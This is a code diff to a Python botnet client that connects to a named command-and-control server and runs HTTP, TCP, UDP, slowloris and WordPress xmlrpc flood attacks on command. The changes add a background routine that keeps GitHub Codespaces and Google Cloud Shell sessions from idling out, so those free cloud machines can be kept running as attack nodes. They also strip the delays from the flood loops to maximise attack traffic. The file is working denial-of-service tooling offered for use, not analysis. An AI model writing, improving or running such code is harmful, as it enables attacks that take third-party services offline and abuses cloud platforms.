@@ -1,6 +1,6 @@
 """
-ENHANCED BOT CLIENT
-===================
+ENHANCED BOT CLIENT WITH ANTI-IDLE PROTECTION
+==============================================
 Features:
 - Auto-connects to https://c2-server-io.onrender.com/
 - Resource-friendly (prevents overload)
@@ -9,6 +9,7 @@ Features:
 - Optional proxy support
 - Works in GitHub Codespaces & Google Cloud Shell
 - Persistent connection with auto-reconnect
+- ANTI-IDLE PROTECTION: Prevents Codespace/Cloud Shell timeout
 
 Install: pip install requests psutil
 Run: python client.py
@@ -23,6 +24,7 @@ import os
 import socket
 import random
 import struct
+import subprocess
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor
 from urllib.parse import urlparse
@@ -43,6 +45,125 @@ except ImportError:
     print("[!] Warning: psutil not available - limited system monitoring")
 
 
+class AntiIdleManager:
+    """Prevents Codespace/Cloud Shell from timing out due to inactivity"""
+    
+    def __init__(self):
+        self.running = False
+        self.thread = None
+        self.environment = self.detect_environment()
+        self.idle_prevention_enabled = self.environment in ['github-codespaces', 'google-cloud-shell']
+        
+    def detect_environment(self):
+        """Detect cloud environment"""
+        if 'CODESPACE_NAME' in os.environ:
+            return 'github-codespaces'
+        elif 'CLOUD_SHELL' in os.environ:
+            return 'google-cloud-shell'
+        elif os.path.exists('/.dockerenv'):
+            return 'docker'
+        else:
+            return 'local'
+    
+    def start(self):
+        """Start anti-idle background tasks"""
+        if not self.idle_prevention_enabled:
+            return
+        
+        self.running = True
+        self.thread = threading.Thread(target=self._anti_idle_worker, daemon=True)
+        self.thread.start()
+        print(f"[+] Anti-Idle Protection: ENABLED for {self.environment}")
+    
+    def stop(self):
+        """Stop anti-idle tasks"""
+        self.running = False
+        if self.thread:
+            self.thread.join(timeout=2)
+    
+    def _anti_idle_worker(self):
+        """Background worker to prevent idle timeout"""
+        idle_activities = [
+            self._touch_dummy_file,
+            self._ping_localhost,
+            self._check_disk_usage,
+            self._list_processes,
+            self._network_check
+        ]
+        
+        activity_index = 0
+        
+        while self.running:
+            try:
+                # Rotate through different activities
+                activity = idle_activities[activity_index % len(idle_activities)]
+                activity()
+                
+                activity_index += 1
+                
+                # Activity every 60 seconds
+                time.sleep(60)
+                
+            except Exception as e:
+                print(f"[!] Anti-idle error: {e}")
+                time.sleep(60)
+    
+    def _touch_dummy_file(self):
+        """Touch a dummy file to show filesystem activity"""
+        try:
+            dummy_file = '/tmp/.bot_keepalive'
+            with open(dummy_file, 'a') as f:
+                f.write(f'{time.time()}\n')
+            # Keep file small
+            if os.path.exists(dummy_file) and os.path.getsize(dummy_file) > 1024:
+                os.remove(dummy_file)
+        except:
+            pass
+    
+    def _ping_localhost(self):
+        """Ping localhost to show network activity"""
+        try:
+            subprocess.run(['ping', '-c', '1', '127.0.0.1'], 
+                         stdout=subprocess.DEVNULL, 
+                         stderr=subprocess.DEVNULL, 
+                         timeout=5)
+        except:
+            pass
+    
+    def _check_disk_usage(self):
+        """Check disk usage"""
+        try:
+            if psutil:
+                psutil.disk_usage('/')
+            else:
+                subprocess.run(['df', '-h'], 
+                             stdout=subprocess.DEVNULL, 
+                             stderr=subprocess.DEVNULL,
+                             timeout=5)
+        except:
+            pass
+    
+    def _list_processes(self):
+        """List processes to show CPU activity"""
+        try:
+            if psutil:
+                list(psutil.process_iter(['pid', 'name']))[:10]
+            else:
+                subprocess.run(['ps', 'aux'], 
+                             stdout=subprocess.DEVNULL, 
+                             stderr=subprocess.DEVNULL,
+                             timeout=5)
+        except:
+            pass
+    
+    def _network_check(self):
+        """Network connectivity check"""
+        try:
+            socket.create_connection(("8.8.8.8", 53), timeout=2)
+        except:
+            pass
+
+
 class EnhancedBot:
     def __init__(self):
         # Auto-connect configuration
@@ -56,6 +177,9 @@ class EnhancedBot:
         self.connection_retries = 0
         self.max_retry_delay = 300
         
+        # Anti-idle manager
+        self.anti_idle = AntiIdleManager()
+        
         # Session pool for performance
         self.session_pool = []
         self.pool_size = 30
@@ -68,15 +192,17 @@ class EnhancedBot:
             'cpu_freq': self.get_cpu_freq(),
             'ram_gb': self.get_ram_gb(),
             'ram_available': self.get_ram_available(),
-            'os': self.detect_environment(),
+            'os': self.anti_idle.environment,
             'hostname': socket.gethostname(),
             'network_interfaces': self.get_network_info(),
+            'anti_idle_enabled': self.anti_idle.idle_prevention_enabled,
             'capabilities': {
                 'http': True,
                 'tcp': True,
                 'udp': True,
                 'resource_optimized': True,
-                'auto_connect': True
+                'auto_connect': True,
+                'anti_idle': True
             }
         }
         
@@ -109,19 +235,6 @@ class EnhancedBot:
     def get_session(self):
         """Get a session from the pool"""
         return random.choice(self.session_pool)
-    
-    def detect_environment(self):
-        """Detect if running in cloud environment"""
-        if os.path.exists('/.dockerenv'):
-            return 'docker'
-        elif 'CODESPACE_NAME' in os.environ:
-            return 'github-codespaces'
-        elif 'CLOUD_SHELL' in os.environ:
-            return 'google-cloud-shell'
-        elif os.path.exists('/data/data/com.termux'):
-            return 'termux-android'
-        else:
-            return sys.platform
     
     def get_cpu_count(self):
         """Get CPU count"""
@@ -209,7 +322,7 @@ class EnhancedBot:
     def display_banner(self):
         """Display bot information"""
         print("\n" + "="*60)
-        print("  ENHANCED BOT CLIENT v3.0")
+        print("  ENHANCED BOT CLIENT v3.1 - ULTRA FAST + ANTI-IDLE")
         print("="*60)
         print(f"\n[+] BOT ID: {self.bot_id}")
         print(f"[+] CPU: {self.specs['cpu_cores']} cores @ {self.specs['cpu_freq']}MHz")
@@ -217,16 +330,21 @@ class EnhancedBot:
         print(f"[+] Environment: {self.specs['os']}")
         print(f"[+] Session Pool: {self.pool_size} connections")
         print(f"[+] Auto-Connect: ENABLED")
+        print(f"[+] Anti-Idle: {'ENABLED' if self.anti_idle.idle_prevention_enabled else 'DISABLED'}")
+        print(f"[+] Speed Mode: ULTRA FAST (Zero delays)")
         print(f"[+] Server: {self.server_url}")
         
         print(f"\n[*] FEATURES:")
+        print(f"    [OK] ULTRA-FAST REQUESTS (NO DELAYS)")
         print(f"    [OK] RESOURCE OPTIMIZED (50-300 threads)")
         print(f"    [OK] MULTI-THREADED ATTACKS")
-        print(f"    [OK] CONNECTION POOLING")
+        print(f"    [OK] CONNECTION POOLING (30 sessions)")
         print(f"    [OK] CUSTOM USER AGENTS FROM SERVER")
         print(f"    [OK] OPTIONAL PROXY SUPPORT")
         print(f"    [OK] AUTO-RECONNECT ON DISCONNECT")
         print(f"    [OK] CLOUD ENVIRONMENT COMPATIBLE")
+        if self.anti_idle.idle_prevention_enabled:
+            print(f"    [OK] ANTI-IDLE PROTECTION (Prevents timeout)")
         
         print("\n" + "="*60 + "\n")
         
@@ -307,13 +425,18 @@ class EnhancedBot:
     def send_status(self, status, message):
         """Send status update"""
         try:
-            self.stats['uptime'] = int(time.time() - self.stats['uptime'])
+            uptime_current = int(time.time() - self.stats['uptime'])
             
             data = {
                 'bot_id': self.bot_id,
                 'status': status,
                 'message': message,
-                'stats': self.stats,
+                'stats': {
+                    'total_attacks': self.stats['total_attacks'],
+                    'successful_attacks': self.stats['successful_attacks'],
+                    'total_requests': self.stats['total_requests'],
+                    'uptime': uptime_current
+                },
                 'active_attacks': len(self.active_attacks)
             }
             requests.post(
@@ -362,6 +485,15 @@ class EnhancedBot:
                 self.cmd_tcp_flood(cmd)
             elif cmd_type == 'udp_flood':
                 self.cmd_udp_flood(cmd)
+            elif cmd_type == 'slowloris':
+                # Map slowloris to http_flood with SLOWLORIS type
+                cmd['method'] = 'GET'
+                cmd['attack_type'] = 'SLOWLORIS'
+                self.cmd_http_flood(cmd)
+            elif cmd_type == 'wordpress_xmlrpc':
+                # Map wordpress to http_flood with XMLRPC type
+                cmd['attack_type'] = 'XMLRPC'
+                self.cmd_http_flood(cmd)
             elif cmd_type == 'layer7':
                 self.cmd_layer7(cmd)
             elif cmd_type == 'sysinfo':
@@ -381,11 +513,12 @@ class EnhancedBot:
         print("[OK] Pong!")
     
     def cmd_http_flood(self, cmd):
-        """OPTIMIZED HTTP FLOOD with multiple attack types"""
+        """ULTRA-FAST HTTP FLOOD with multiple attack types"""
         target = cmd['target']
         duration = cmd.get('duration', 60)
         threads = cmd.get('threads', 100)
-        attack_type = cmd.get('attack_type', 'GET')
+        method = cmd.get('method', 'GET')
+        attack_type = cmd.get('attack_type', method)
         user_agents = cmd.get('user_agents', [
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
         ])
@@ -481,7 +614,8 @@ class EnhancedBot:
   </params>
 </methodCall>'''
                         headers['Content-Type'] = 'text/xml'
-                        r = session.post(target + '/xmlrpc.php', headers=headers, 
+                        xmlrpc_target = target if '/xmlrpc.php' in target else target.rstrip('/') + '/xmlrpc.php'
+                        r = session.post(xmlrpc_target, headers=headers, 
                                        data=xml_data, timeout=3, verify=False, proxies=proxy_dict)
                     
                     elif attack_type == 'RUDY':
@@ -501,11 +635,13 @@ class EnhancedBot:
                     if r.status_code < 500:
                         success_count[0] += 1
                     
-                    time.sleep(0.001 if attack_type not in ['SLOWLORIS', 'RUDY'] else 0)
+                    # ULTRA FAST - NO DELAY for maximum speed
+                    # time.sleep(0.001 if attack_type not in ['SLOWLORIS', 'RUDY'] else 0)
                     
                 except:
                     request_count[0] += 1
-                    time.sleep(0.01)
+                    # Minimal delay on error
+                    # time.sleep(0.01)
         
         print(f"[+] Launching {max_threads} attack threads...")
         
@@ -572,7 +708,7 @@ class EnhancedBot:
         request_count = [0]
         
         def tcp_worker():
-            """TCP worker with multiple attack types"""
+            """TCP worker - ULTRA FAST"""
             end_time = time.time() + duration
             
             while time.time() < end_time and attack_id in self.active_attacks:
@@ -604,10 +740,11 @@ class EnhancedBot:
                         sock.close()
                     
                     request_count[0] += 1
-                    time.sleep(0.01)
+                    # ULTRA FAST - NO DELAY
+                    # time.sleep(0.01)
                 except:
                     request_count[0] += 1
-                    time.sleep(0.05)
+                    # time.sleep(0.05)
         
         with ThreadPoolExecutor(max_workers=max_threads) as executor:
             futures = [executor.submit(tcp_worker) for _ in range(max_threads)]
@@ -659,7 +796,7 @@ class EnhancedBot:
         request_count = [0]
         
         def udp_worker():
-            """UDP worker with multiple attack types"""
+            """UDP worker - ULTRA FAST"""
             end_time = time.time() + duration
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             
@@ -683,7 +820,8 @@ class EnhancedBot:
                     
                     sock.sendto(payload, (host, port))
                     request_count[0] += 1
-                    time.sleep(0.001)
+                    # ULTRA FAST - NO DELAY
+                    # time.sleep(0.001)
                 except:
                     pass
             
@@ -728,6 +866,8 @@ class EnhancedBot:
         else:
             info_lines.append(f"RAM: {self.specs['ram_gb']}GB")
         
+        info_lines.append(f"Environment: {self.specs['os']}")
+        info_lines.append(f"Anti-Idle: {'ON' if self.anti_idle.idle_prevention_enabled else 'OFF'}")
         info_lines.append(f"Active Attacks: {len(self.active_attacks)}")
         info_lines.append(f"Total Attacks: {self.stats['total_attacks']}")
         info_lines.append(f"Total Requests: {self.stats['total_requests']:,}")
@@ -749,6 +889,9 @@ class EnhancedBot:
     
     def run(self):
         """Main loop with auto-reconnect"""
+        # Start anti-idle protection
+        self.anti_idle.start()
+        
         while self.running:
             try:
                 # Check internet connection first
@@ -796,6 +939,7 @@ class EnhancedBot:
                         
                     except KeyboardInterrupt:
                         print("\n[!] Exiting...")
+                        self.anti_idle.stop()
                         return
                     except Exception as e:
                         print(f"\n[!] Error: {e}")
@@ -839,6 +983,7 @@ class EnhancedBot:
                     except KeyboardInterrupt:
                         print("\n[!] Stopping...")
                         self.cmd_stop_all()
+                        self.anti_idle.stop()
                         self.running = False
                         return
                         
@@ -848,13 +993,14 @@ class EnhancedBot:
                 
             except KeyboardInterrupt:
                 print("\n[!] Exiting...")
+                self.anti_idle.stop()
                 self.running = False
                 return
 
 
 if __name__ == '__main__':
     print("\n" + "="*60)
-    print("  ENHANCED BOT CLIENT - AUTO CONNECT")
+    print("  ENHANCED BOT CLIENT - ULTRA FAST + ANTI-IDLE")
     print("="*60)
     
     try:
